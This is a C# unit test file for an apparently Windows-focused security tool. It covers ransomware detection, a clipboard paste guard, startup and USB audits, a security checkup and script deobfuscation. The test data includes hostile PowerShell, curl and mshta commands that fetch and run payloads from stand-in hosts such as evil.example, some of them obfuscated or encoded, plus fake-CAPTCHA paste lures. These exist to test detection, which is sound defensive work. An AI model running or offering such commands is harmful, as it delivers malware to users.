using System.Text;
using Agamemnon.Core.Checkup;
using Agamemnon.Core.Protection;
using Agamemnon.Core.Scanning;
using Agamemnon.Core.Startup;
using Agamemnon.Core.Updates;

namespace Agamemnon.Core.Tests;

public sealed class ManualTime(DateTimeOffset start) : TimeProvider
{
    public DateTimeOffset Now { get; set; } = start;

    public override DateTimeOffset GetUtcNow() => Now;
}

public class RansomwareTests
{
    private static readonly byte[] Random = [0x8A, 0x13, 0xF0, 0x02, 0x99, 0x01, 0x7C, 0xEE, 0x00, 0x45, 0x10, 0x03];

    [Fact]
    public void Scrambled_files_are_ransomware()
    {
        string[] paths = [.. Enumerable.Range(0, 30).Select(i => $@"C:\Users\a\Pictures\photo{i}.jpg")];
        RansomwareVerdict? verdict = RansomwareDetector.Analyse(paths, _ => Random);
        Assert.Equal(RansomwareSign.ContentScrambled, verdict?.Sign);
    }

    [Fact]
    public void Valid_files_are_normal_work()
    {
        string[] paths = [.. Enumerable.Range(0, 30).Select(i => $@"C:\Users\a\Pictures\photo{i}.jpg")];
        Assert.Null(RansomwareDetector.Analyse(paths, _ => [0xFF, 0xD8, 0xFF, 0xE0, 0, 0x10]));
    }

    [Fact]
    public void Many_files_with_the_same_new_extension_are_ransomware()
    {
        string[] paths = [.. Enumerable.Range(0, 12).Select(i => $@"C:\Users\a\Documents\report{i}.docx.locked")];
        RansomwareVerdict? verdict = RansomwareDetector.Analyse(paths, _ => null);
        Assert.Equal(RansomwareSign.MassRenamed, verdict?.Sign);
        Assert.Equal(".locked", verdict?.Extension);
    }

    [Fact]
    public void Backups_and_temporary_copies_are_not_renames()
    {
        string[] paths = [.. Enumerable.Range(0, 12).Select(i => $@"C:\Users\a\Documents\report{i}.docx.bak")];
        Assert.Null(RansomwareDetector.Analyse(paths, _ => null));
    }

    [Theory]
    [InlineData("HOW_TO_DECRYPT.txt", true)]
    [InlineData("readme_decrypt_files.html", true)]
    [InlineData("readme.txt", false)]
    [InlineData("how_to_decrypt.docx", false)]
    public void Recognises_ransom_notes(string name, bool expected) =>
        Assert.Equal(expected, RansomwareDetector.IsRansomNote(name));

    [Fact]
    public void Text_files_must_still_be_text()
    {
        Assert.True(RansomwareDetector.ContentMatchesType(".txt", "Merhaba dünya, bu bir not."u8));
        Assert.False(RansomwareDetector.ContentMatchesType(".txt", Random));
        Assert.Null(RansomwareDetector.ContentMatchesType(".xyz", Random));
    }

    [Fact]
    public void A_burst_needs_enough_changes_inside_the_window()
    {
        var time = new ManualTime(new DateTimeOffset(2026, 10, 23, 12, 0, 0, TimeSpan.Zero));
        var detector = new RansomwareDetector(time);
        for (int i = 0; i < RansomwareDetector.BurstFiles - 1; i++)
        {
            detector.Record($@"C:\Users\a\Documents\f{i}.docx");
        }

        detector.Record(@"C:\Users\a\Documents\~$f1.docx"); // Office lock files don't count
        Assert.Null(detector.TakeBurst());
        detector.Record(@"C:\Users\a\Documents\last.docx");
        Assert.NotNull(detector.TakeBurst());

        detector.MarkIncident();
        time.Now += TimeSpan.FromSeconds(30);
        for (int i = 0; i < 40; i++)
        {
            detector.Record($@"C:\Users\a\Documents\g{i}.docx");
        }

        Assert.Null(detector.TakeBurst()); // quiet period after an incident
        time.Now += TimeSpan.FromMinutes(3);
        Assert.Null(detector.TakeBurst()); // and the old changes have expired
    }
}

public class PasteGuardTests
{
    [Theory]
    [InlineData("powershell -w hidden -c \"iwr https://evil.example/a.ps1 | iex\"", PasteDanger.DownloadAndRun)]
    [InlineData("powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://1.2.3.4/x')\"", PasteDanger.DownloadAndRun)]
    [InlineData("cmd /c curl -o %TEMP%\\a.exe https://x.example/a.exe & start %TEMP%\\a.exe", PasteDanger.DownloadAndRun)]
    [InlineData("powershell -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcABzADoALwAvAGUAeAAuAGMAbwBtACkA", PasteDanger.HiddenCommand)]
    [InlineData("mshta https://verify.example/captcha.hta", PasteDanger.RemoteHta)]
    [InlineData("powershell -c \"Start-Process calc\" # ✅ I am not a robot - reCAPTCHA Verification ID: 7537", PasteDanger.FakeVerification)]
    [InlineData("p^o^w^e^r^s^h^e^l^l -c \"i`w`r https://e.example/x | i`e`x\"", PasteDanger.DownloadAndRun)]
    public void Recognises_malware_commands(string text, PasteDanger expected) =>
        Assert.Equal(expected, ClipboardCommandGuard.Assess(text));

    [Theory]
    [InlineData("irm https://community.chocolatey.org/install.ps1 | iex")]
    [InlineData("powershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"")]
    [InlineData("Get-ChildItem C:\\Users -Recurse | Select-Object Name")]
    [InlineData("The meeting is at 3 pm, see you there!")]
    [InlineData("short")]
    public void Leaves_ordinary_text_alone(string text) =>
        Assert.Null(ClipboardCommandGuard.Assess(text));
}

public class RemovableDriveTests
{
    [Fact]
    public void Autorun_that_starts_a_program_is_found()
    {
        Assert.Equal("setup.exe", RemovableDriveInspector.AutorunLaunches("[autorun]\r\nopen=setup.exe\r\nicon=a.ico"));
        Assert.Equal("x.exe", RemovableDriveInspector.AutorunLaunches("[AutoRun]\nshell\\open\\command=x.exe"));
        Assert.Null(RemovableDriveInspector.AutorunLaunches("[autorun]\nicon=drive.ico\nlabel=Photos"));
        Assert.Null(RemovableDriveInspector.AutorunLaunches("[other]\nopen=x.exe"));
    }

    [Fact]
    public void Disguised_programs_on_a_drive_are_reported()
    {
        using var drive = new TempDir();
        drive.File("Holiday photos.jpg.exe", "MZ");
        drive.File("Documents/report.pdf", "%PDF-1.7");
        drive.File("autorun.inf", "[autorun]\nopen=Holiday photos.jpg.exe");
        IReadOnlyList<DriveFinding> findings = RemovableDriveInspector.Inspect(drive.Path);
        Assert.Contains(findings, f => f.Path.EndsWith("Holiday photos.jpg.exe", StringComparison.Ordinal));
        Assert.Contains(findings, f => f.Detection.Name == "autorun.inf starts a program");
        Assert.DoesNotContain(findings, f => f.Path.EndsWith("report.pdf", StringComparison.Ordinal));
    }
}

public class SecurityCheckupTests
{
    private static readonly DateTimeOffset Now = new(2026, 10, 23, 12, 0, 0, TimeSpan.Zero);

    [Theory]
    [InlineData(19045, "Professional", CheckState.Bad)]       // Windows 10: updates ended in October 2025
    [InlineData(22631, "Core", CheckState.Bad)]               // 23H2 Home ended November 2025
    [InlineData(22631, "Enterprise", CheckState.Warning)]     // 23H2 Enterprise ends November 2026
    [InlineData(26100, "Professional", CheckState.Bad)]       // 24H2 Home/Pro ended 13 October 2026
    [InlineData(26200, "Professional", CheckState.Good)]      // 25H2 until October 2027
    [InlineData(26300, "Professional", CheckState.Good)]      // newer than the table
    [InlineData(17763, "Professional", CheckState.Bad)]
    public void Knows_which_Windows_releases_still_get_updates(int build, string edition, CheckState expected) =>
        Assert.Equal(expected, SecurityCheckup.WindowsSupport(new SecuritySnapshot { WindowsBuild = build, Edition = edition }, DateOnly.FromDateTime(Now.UtcDateTime)).State);

    [Fact]
    public void A_well_configured_PC_is_good()
    {
        var snapshot = new SecuritySnapshot
        {
            WindowsBuild = 26200, Edition = "Professional", DefenderRealTime = true, DefenderSignaturesUpdated = Now.AddHours(-3),
            TamperProtection = true, ControlledFolderAccess = true, SmartScreen = true, FirewallProfilesOn = 3, UacEnabled = true,
            UacSilentForAdmins = false, SystemDriveEncrypted = true, SecureBoot = true, MemoryIntegrity = true, LsaProtection = true,
            RemoteDesktop = false, Smb1 = false, AutomaticUpdatesDisabledByPolicy = false, AutoRunDisabled = true, Wifi = WifiSecurity.Wpa3,
        };
        IReadOnlyList<SecurityCheck> checks = SecurityCheckup.Evaluate(snapshot, Now);
        Assert.All(checks, c => Assert.Equal(CheckState.Good, c.State));
        Assert.Equal(CheckState.Good, SecurityCheckup.Overall(checks));
    }

    [Fact]
    public void Problems_are_rated()
    {
        var snapshot = new SecuritySnapshot { DefenderRealTime = false, FirewallProfilesOn = 2, Wifi = WifiSecurity.Open, Smb1 = true };
        IReadOnlyList<SecurityCheck> checks = SecurityCheckup.Evaluate(snapshot, Now);
        Assert.Equal(CheckState.Bad, checks.Single(c => c.Id == "defender").State);
        Assert.Equal(CheckState.Warning, checks.Single(c => c.Id == "firewall").State);
        Assert.Equal(CheckState.Bad, checks.Single(c => c.Id == "wifi").State);
        Assert.Equal(CheckState.Bad, checks.Single(c => c.Id == "smb1").State);
        Assert.Equal(CheckState.Unknown, checks.Single(c => c.Id == "secureBoot").State);
        Assert.Equal(CheckState.Bad, SecurityCheckup.Overall(checks));
    }
}

public class UpdateTests
{
    private const string Release = """
        {
          "tag_name": "v4.1.0", "html_url": "https://github.com/Agamemnon-Intelligence/Agamemnon-windows/releases/tag/v4.1.0",
          "draft": false, "prerelease": false,
          "assets": [
            { "name": "Agamemnon-4.1.0-x64.msi", "browser_download_url": "https://github.com/Agamemnon-Intelligence/Agamemnon-windows/releases/download/v4.1.0/Agamemnon-4.1.0-x64.msi", "size": 10, "digest": null },
            { "name": "Agamemnon-4.1.0-Setup.exe", "browser_download_url": "https://github.com/Agamemnon-Intelligence/Agamemnon-windows/releases/download/v4.1.0/Agamemnon-4.1.0-Setup.exe", "size": 20, "digest": "sha256:ABCDEF" }
          ]
        }
        """;

    [Fact]
    public void Finds_a_newer_release_and_its_setup_program()
    {
        AvailableUpdate? update = AgamemnonUpdateChecker.Pick(GitHubRelease.Parse(Release)!, new Version(4, 0, 0));
        Assert.NotNull(update);
        Assert.Equal(new Version(4, 1, 0), update.Version);
        Assert.EndsWith("-Setup.exe", update.Setup.AbsoluteUri, StringComparison.Ordinal);
        Assert.Equal("abcdef", update.Sha256);
    }

    [Fact]
    public void Ignores_the_same_or_older_versions_and_foreign_downloads()
    {
        Assert.Null(AgamemnonUpdateChecker.Pick(GitHubRelease.Parse(Release)!, new Version(4, 1, 0, 0)));
        string foreign = Release.Replace("https://github.com/Agamemnon-Intelligence/Agamemnon-windows/releases/download/v4.1.0/Agamemnon-4.1.0-Setup.exe",
            "https://example.com/Agamemnon-4.1.0-Setup.exe", StringComparison.Ordinal);
        Assert.Null(AgamemnonUpdateChecker.Pick(GitHubRelease.Parse(foreign)!, new Version(4, 0, 0)));
    }

    [Theory]
    [InlineData("v4.0", "4.0.0")]
    [InlineData("4.0.2", "4.0.2")]
    [InlineData("v5", "5.0.0")]
    [InlineData("nightly", null)]
    [InlineData("v4.1.0-beta", null)]
    public void Parses_release_tags(string tag, string? expected) =>
        Assert.Equal(expected is null ? null : Version.Parse(expected), AgamemnonUpdateChecker.ParseVersion(tag));

    [Fact]
    public void Reads_winget_upgrade_tables()
    {
        const string output = "   - \b \r\nName                 Id                     Version  Available Source\r\n" +
                              "-----------------------------------------------------------------------\r\n" +
                              "Mozilla Firefox (x64) Mozilla.Firefox         131.0    132.0.1   winget\r\n" +
                              "7-Zip                Igor.7zip               23.01    24.08     winget\r\n" +
                              "\r\n2 upgrades available.\r\n";
        IReadOnlyList<SoftwareUpdate> updates = WingetOutput.ParseUpgrades(output);
        Assert.Equal(2, updates.Count);
        Assert.Equal("Igor.7zip", updates[1].Id);
        Assert.Equal("24.08", updates[1].Available);
        Assert.Empty(WingetOutput.ParseUpgrades("No installed package found matching input criteria."));
    }
}

public class StartupAuditTests
{
    private static string Same(string s) => s;

    [Theory]
    [InlineData("\"C:\\Program Files\\App\\app.exe\" --tray", "C:\\Program Files\\App\\app.exe")]
    [InlineData("C:\\Tools\\tool.exe -q", "C:\\Tools\\tool.exe")]
    [InlineData("rundll32.exe shell32.dll,Control_RunDLL", "rundll32.exe")]
    public void Finds_the_program_a_command_starts(string command, string program) =>
        Assert.Equal(program, StartupAudit.ProgramOf(command));

    [Theory]
    [InlineData("powershell.exe -w hidden -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA=")]
    [InlineData("mshta.exe javascript:close()")]
    [InlineData("C:\\Users\\a\\AppData\\Local\\Temp\\upd.exe")]
    [InlineData("C:\\Users\\a\\AppData\\Roaming\\svc.exe")]
    [InlineData("C:\\Users\\a\\Music\\svchost.exe")]
    public void Flags_risky_startup_items(string command) =>
        Assert.NotNull(StartupAudit.Inspect(new StartupItem(StartupLocation.UserRunKey, "x", command), Same));

    [Theory]
    [InlineData("\"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background")]
    [InlineData("C:\\Users\\a\\AppData\\Local\\Discord\\Update.exe --processStart Discord.exe")]
    [InlineData("C:\\Windows\\System32\\SecurityHealthSystray.exe")]
    public void Leaves_normal_startup_items_alone(string command) =>
        Assert.Null(StartupAudit.Inspect(new StartupItem(StartupLocation.UserRunKey, "x", command), Same));

    [Fact]
    public void Spots_new_and_changed_items()
    {
        StartupItem a = new(StartupLocation.UserRunKey, "A", "a.exe");
        StartupItem b = new(StartupLocation.UserRunKey, "B", "b.exe");
        IReadOnlyList<StartupItem> changed = StartupAudit.NewOrChanged([a, b], [a, b with { Command = "evil.exe" }, new StartupItem(StartupLocation.StartupFolder, "C", "c.lnk")]);
        Assert.Equal(["B", "C"], changed.Select(i => i.Name));
    }
}

public class DeviceUsageTests
{
    [Fact]
    public void Reports_apps_that_start_using_a_device()
    {
        var time = new ManualTime(new DateTimeOffset(2026, 10, 23, 12, 0, 0, TimeSpan.Zero));
        var tracker = new DeviceUsageTracker(time);
        DeviceUse zoomIdle = new(PrivacyDevice.Camera, "C:#Program Files#Zoom#bin#Zoom.exe", true, 100, 200);
        DeviceUse zoomOn = zoomIdle with { LastStart = 300, LastStop = 0 };
        DeviceUse alreadyOn = new(PrivacyDevice.Microphone, "Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe", false, 50, 0);

        Assert.Empty(tracker.Update([zoomIdle, alreadyOn])); // first look only learns
        DeviceUse started = Assert.Single(tracker.Update([zoomOn, alreadyOn]));
        Assert.Equal("Zoom.exe", started.AppName);
        Assert.Equal("WindowsSoundRecorder", alreadyOn.AppName);

        Assert.Empty(tracker.Update([zoomIdle]));
        Assert.Empty(tracker.Update([zoomOn])); // within the quiet period
        time.Now += TimeSpan.FromMinutes(31);
        Assert.Empty(tracker.Update([zoomIdle]));
        Assert.Single(tracker.Update([zoomOn]));
    }
}

public class DeobfuscatorTests
{
    private static string Utf16Base64(string text) => Convert.ToBase64String(Encoding.Unicode.GetBytes(text));

    [Fact]
    public void Reveals_PowerShell_encoded_commands()
    {
        string script = "powershell -enc " + Utf16Base64("IEX (New-Object Net.WebClient).DownloadString('http://x.example/p')");
        Assert.Contains("downloadstring", Deobfuscator.Reveal(script), StringComparison.Ordinal);
    }

    [Fact]
    public void Reveals_split_strings_and_escapes()
    {
        string joined = Deobfuscator.Reveal("$a = 'Do'+'wn'+'lo'+'ad'+'St'+'ri'+'ng'; $b = 'Ne'+'t.'+'We'+'bC'+'li'+'ent'");
        Assert.Contains("downloadstring", joined, StringComparison.Ordinal);
        string escaped = Deobfuscator.Reveal("var s = \"\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x63\";");
        Assert.Contains("cmd.exe /c", escaped, StringComparison.Ordinal);
    }

    [Fact]
    public void Reveals_character_code_lists()
    {
        string script = "$c = [char]105+[char]101+[char]120+[char]32+[char]40+[char]105+[char]119+[char]114+[char]41";
        Assert.Contains("iex (iwr)", Deobfuscator.Reveal(script), StringComparison.Ordinal);
    }

    [Fact]
    public void Plain_scripts_have_nothing_hidden()
    {
        Assert.Equal(string.Empty, Deobfuscator.Reveal("Get-ChildItem $env:USERPROFILE | Where-Object Length -gt 1MB"));
        Assert.Equal(EngineResult.Clean, HiddenScriptEngine.Inspect("Write-Host 'Hello'"));
    }

    [Fact]
    public void Hidden_download_and_run_is_malicious()
    {
        string script = "powershell -w hidden -enc " + Utf16Base64("$w = New-Object Net.WebClient; IEX $w.DownloadString('http://x.example/p')");
        Detection detection = Assert.Single(HiddenScriptEngine.Inspect(script).Detections);
        Assert.Equal(Severity.Malicious, detection.Severity);
    }
}

public class HostsFileTests
{
    [Fact]
    public void Flags_redirected_security_and_update_sites()
    {
        IReadOnlyList<HostsEntry> entries = HostsFile.Parse("# comment\n127.0.0.1 localhost\n0.0.0.0 ads.example.com\n127.0.0.1 www.virustotal.com update.microsoft.com # blocked\n");
        Assert.Equal(4, entries.Count);
        Assert.Equal(["www.virustotal.com", "update.microsoft.com"], HostsFile.Suspicious(entries).Select(e => e.Host));
    }
}

public class ScanHistoryTests
{
    [Fact]
    public void Keeps_the_newest_logs_and_exports_text()
    {
        using var dir = new TempDir();
        var history = new ScanHistory(Path.Combine(dir.Path, "scans.json"));
        var finding = new FileScanResult(@"C:\x\bad.exe", @"C:\x\bad.exe", "ab", 1, [new Detection("YARA", "Test", Severity.Malicious)], []);
        var report = new ScanReport(DateTimeOffset.Now.AddMinutes(-1), DateTimeOffset.Now, 10, [finding], ["ClamAV skipped"], false);
        for (int i = 0; i < ScanHistory.MaxLogs + 3; i++)
        {
            history.Add(ScanLog.From(report, i == ScanHistory.MaxLogs + 2 ? "Quick" : "Full"));
        }

        IReadOnlyList<ScanLog> logs = history.Load();
        Assert.Equal(ScanHistory.MaxLogs, logs.Count);
        Assert.Equal("Quick", logs[0].Kind);
        string text = logs[0].ToText();
        Assert.Contains("[Malicious] C:\\x\\bad.exe", text, StringComparison.Ordinal);
        Assert.Contains("YARA: Test", text, StringComparison.Ordinal);
        Assert.Contains("ClamAV skipped", text, StringComparison.Ordinal);
    }
}
